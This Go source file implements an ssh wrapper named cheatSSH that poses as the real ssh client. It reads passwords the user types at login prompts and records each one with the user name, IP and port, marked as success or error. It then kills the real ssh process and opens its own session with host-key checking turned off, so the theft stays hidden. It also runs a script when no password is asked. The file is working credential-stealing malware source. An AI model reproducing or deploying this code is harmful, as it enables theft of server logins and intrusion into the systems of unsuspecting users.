package main

import (
	"fmt"
	"github.com/google/goterm/term"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
	"time"
)

//var SSHIgnore = regexp.MustCompile("not a terminal")
var SSHAsk = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(错误)`)
var SSHAskEnd = regexp.MustCompile(`(: $)|(：$)`)
var SSHSuccess = regexp.MustCompile(`(Welcome to)|(Last login)|(Last failed login)`)
var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)
var SSHFirngerprintPrefix = regexp.MustCompile(`Are you sure`)
var SSHFirngerprintSuffix = regexp.MustCompile(`\?`)

func cheatSSH() {
	var pty, err = term.OpenPTY()
	ExecIfErr(err)
	var user, password, ip, port string
	c := exec.Command("ssh", os.Args[1:]...)
	c.Stdout = pty.Slave
	c.Stdin = pty.Slave
	c.Stderr = pty.Slave
	c.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true}
	c.Start()

	var p ptyReader
	p.Reader(pty)
	p.AddRule(SSHAsk, SSHAskEnd)
	p.AddRule(SSHFirngerprintPrefix, SSHFirngerprintSuffix)

	var First bool
	var AskPass bool
	go func() {
		defer func() {
			p.ReadLock <- struct{}{}
		}()
		line := p.Readline()
		if strings.TrimSpace(line) == "" {
			line = p.Readline()
		}
		if SSHIfFirst.MatchString(line) {
			First = true
			fmt.Print(line)
			for {
				line = p.Readline()
				fmt.Print(line)
				if SSHFirngerprintSuffix.MatchString(line) {
					var input string
					fmt.Scanln(&input)
					if !strings.Contains(strings.ToLower(input), "n") {
						pty.Master.WriteString("yes\r")
					} else {
						os.Exit(1)
					}
					p.Readline()
					p.Readline()
					line = p.SteamPrint(SSHAsk, SSHAskEnd)
					break
				}
			}
		}
		if !failAuthRE.MatchString(line) && !First {
			return
		}
		AskPass = true
		//fmt.Println(">> yes")
		for {
			if p.IsClose() {
				return
			}
			if password != "" && failAuthRE.MatchString(line) {
				WritePassword(password + " error")
				password = ""
			}
			if strings.TrimSpace(line) != "" && password != "" {
				user, ip, port = getSSHInfo()
				prefix := user + " " + ip + " " + port
				WritePassword(prefix + " " + password + " success")
				c.Process.Kill()
				return
			}

			fmt.Print(line)
			if SSHAsk.MatchString(line) && SSHAskEnd.MatchString(line) {
				password = GetPassword()
				pty.Master.WriteString(password + "\r")
			}
			line = p.Readline()
		}

	}()
	c.Wait()
	if AskPass {
		time.Sleep(time.Second / 2)
	}
	p.Close()

	if AskPass && password != "" {
		startSSHShell(user, password, ip, port)
	}
	if !AskPass && password == "" {
		ExecScript(cmd)
	}
}
func getSSHInfo() (string, string, string) {
	var user, ip, port string
	infoRE := regexp.MustCompile(`\s(.+?)@(\d+\.\d+\.\d+\.\d+)`)
	info := infoRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
	portRE := regexp.MustCompile(`-p\s+(\d+)`)
	portInfo := portRE.FindAllStringSubmatch(strings.Join(os.Args, " "), 1)
	if len(info[0]) == 3 {
		user = info[0][1]
		ip = info[0][2]
	} else {
		return "", "", ""
	}
	if len(portInfo) == 0 {
		port = "22"
	} else if len(portInfo[0]) == 2 {
		port = portInfo[0][1]
	} else {
		return "", "", ""
	}
	return user, ip, port
}
func startSSHShell(user string, password string, ip string, port string) {

	client, err := ssh.Dial("tcp", ip+":"+port, &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	CheckErr(err)
	session, err := client.NewSession()
	defer session.Close()
	fd := int(os.Stdin.Fd())
	oldState, err := terminal.MakeRaw(fd)
	CheckErr(err)
	defer terminal.Restore(fd, oldState)
	// 拿到当前终端文件描述符
	termWidth, termHeight, err := terminal.GetSize(fd)
	// request pty
	err = session.RequestPty("xterm-256color", termHeight, termWidth, ssh.TerminalModes{})
	CheckErr(err)
	// 对接 std
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	session.Stdin = os.Stdin

	err = session.Shell()
	err = session.Wait()

}
